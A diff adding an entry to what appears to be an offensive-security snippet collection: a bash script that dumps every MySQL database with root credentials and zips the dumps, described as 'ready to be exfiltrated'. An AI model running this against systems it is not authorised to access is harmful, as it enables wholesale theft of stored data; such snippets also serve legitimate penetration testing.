@@ -1,0 +1,27 @@
+title = "Dump all MySQL databases from server"
+description = ""
+tags = ["MySQL", "web"]
+source = [""]
+
+[[data]]
+description = "Change user and password and run it. Databases will be zipped to dumps.zip, ready to be exfiltrated."
+language = "bash"
+command = """#!/bin/bash
+
+USER="root"
+PASS="password"
+
+databases=`mysql -u $USER -p$PASS -e "SHOW DATABASES;" | tr -d "| " | grep -v Database`
+
+path=$(mktemp -d)
+
+for db in $databases; do
+    echo "Dumping db: $db"
+    mysqldump -u $USER -p$PASS --databases $db > ${path}/`date +%Y%m%d`"_$db.sql"
+done
+
+zip -r dumps.zip ${path}/*.sql
+
+rm -fr $path
+
+echo 'Saved dumps at dumps.zip'"""
